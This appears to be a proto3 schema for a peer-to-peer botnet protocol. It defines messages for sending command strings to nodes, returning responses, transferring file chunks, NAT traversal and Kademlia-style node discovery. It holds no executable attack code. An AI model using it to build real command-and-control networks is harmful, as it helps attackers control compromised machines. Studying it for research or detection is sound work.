syntax = "proto3";
package botnet_p2p;

message Message {
    enum MessageType {
        UNDEFINED = 0;
        COMMAND = 1;
        RESPONSE = 2;
        FILE_CHUNK = 3;
        NAT_REQUEST = 4;
        NAT_CHECK = 5;
        PING = 6;
        PING_RESPONSE = 7;
        LEAVE = 8;
        FIND_NODE = 9;
        FOUND_NODES = 10;
    }

    enum Status {
        FAIL = 0;
        OK = 1;
    }

    message Contact {
        string guid = 1;
        string IP = 2;
        uint32 port = 3;
        bool isNAT = 4;
    }

    message CommandMsg {
        string commandString = 1;
        bool sendResponse = 2;
    }

    message ResponseMsg {
        string value = 1;
        Status status = 2;
    }

    message FileChunkMsg {
        string path = 1;
        bool name = 2;
        uint32 chunkNumber = 3;
        uint32 allChunks = 4;
        uint32 chunkSize = 5;
        bytes data = 6;
    }

    message NATRequestMsg {
        string guid = 1;
    }

    message NATCheckMsg {
        string guid = 1;
    }

    message FindNodeMsg {
        string guid = 1;
    }

    message FoundNodesMsg {
        repeated Contact nodes = 1;
    }

    string uuid = 1;
    MessageType type = 2;
    Contact sender = 3;
    Contact receiver = 4;
    bool propagation = 5;
    bytes signature = 6;
    oneof payload {
        CommandMsg command = 7;
        ResponseMsg response = 8;
        FileChunkMsg fileChunk = 9;
        NATRequestMsg NATRequest = 10;
        NATCheckMsg NATCheck = 11;
        FindNodeMsg findNode = 13;
        FoundNodesMsg foundNodes = 14;
    }
}